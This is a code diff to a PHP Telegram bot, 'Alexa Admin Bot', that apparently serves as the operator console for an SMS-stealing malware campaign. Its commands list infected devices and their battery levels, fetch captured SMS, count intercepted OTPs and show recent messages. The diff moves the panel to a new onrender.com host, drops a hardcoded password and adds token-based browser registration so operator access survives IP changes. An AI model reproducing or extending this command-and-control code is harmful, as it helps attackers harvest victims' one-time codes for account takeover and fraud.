@@ -69,15 +69,16 @@ if ($text === '/start') {
   $kbd = ['inline_keyboard' => [
     [['text' => '📊 Devices', 'callback_data' => '/devices'], ['text' => '💬 SMS', 'callback_data' => '/sms']],
     [['text' => '📋 IP List', 'callback_data' => '/listips'], ['text' => '📡 Ping', 'callback_data' => '/ping']],
-    [['text' => '👁️ Visitors', 'callback_data' => '/visitors'], ['text' => '🌐 Panel', 'url' => 'https://alexa01-1.onrender.com/panel.php']]
+    [['text' => '👁️ Visitors', 'callback_data' => '/visitors'], ['text' => '🔑 Register', 'callback_data' => '/register']],
+    [['text' => '🌐 Panel', 'url' => 'https://alexaadmin.onrender.com/panel.php']]
   ]];
   send($chatId, "🤖 <b>Alexa Admin Bot</b>\n\n"
-    . "✅ Panel: https://alexa01-1.onrender.com/panel.php\n"
-    . "🔑 Password: Alexa\n\n"
+    . "✅ Panel: https://alexaadmin.onrender.com/panel.php\n\n"
     . "📋 <b>Commands:</b>\n"
     . "/addip &lt;ip&gt; - Add IP\n"
     . "/removeip &lt;ip&gt; - Remove IP\n"
     . "/listips - Show IPs\n"
+    . "/register - Register browser (survives IP change)\n"
     . "/devices - Online/Offline\n"
     . "/sms - Fetch SMS\n"
     . "/ping - Panel ping\n"
@@ -122,6 +123,18 @@ if ($text === '/listips') {
   die('ok');
 }
 
+// Register device (token-based auth survives IP change)
+if ($text === '/register') {
+  $code = bin2hex(random_bytes(16));
+  $reg = fb('panel/register_codes');
+  if (!is_array($reg)) $reg = [];
+  $reg[$code] = ['time' => time(), 'chat' => $chatId];
+  fbPut('panel/register_codes', $reg);
+  $link = 'https://alexaadmin.onrender.com/panel.php?register=' . $code;
+  send($chatId, "🔑 <b>Register this browser</b>\n\nClick the link below to authorize your browser permanently. Even if your IP changes, access will work.\n\n🌐 <a href=\"$link\">$link</a>\n\n⏳ Code expires in 5 minutes.");
+  die('ok');
+}
+
 // Devices
 if ($text === '/devices') {
   $raw = fb('user_data'); $on = 0; $off = 0; $bat = [];
@@ -151,7 +164,7 @@ if ($text === '/sms') {
     }
   }
   $total = count($sms); $otpC = count(array_filter($sms, fn($s) => !empty($s['otp'])));
-  $txt = "📩 <b>SMS</b>\n💬 $total SMS\n🔑 $otpC OTPs\n\n📱 View in panel:\nhttps://alexa01-1.onrender.com/panel.php";
+  $txt = "📩 <b>SMS</b>\n💬 $total SMS\n🔑 $otpC OTPs\n\n📱 View in panel:\nhttps://alexaadmin.onrender.com/panel.php";
   $recent = array_slice(array_reverse($sms), 0, 5);
   if ($recent) {
     $txt .= "\n\n━━ <b>Recent 5</b> ━━";
@@ -163,7 +176,7 @@ if ($text === '/sms') {
     }
   }
   send($chatId, $txt, ['reply_markup' => json_encode(['inline_keyboard' => [
-    [['text' => '📩 View All', 'url' => 'https://alexa01-1.onrender.com/panel.php']],
+    [['text' => '📩 View All', 'url' => 'https://alexaadmin.onrender.com/panel.php']],
     [['text' => '🔄 Refresh', 'callback_data' => '/sms']]
   ]])]);
   die('ok');
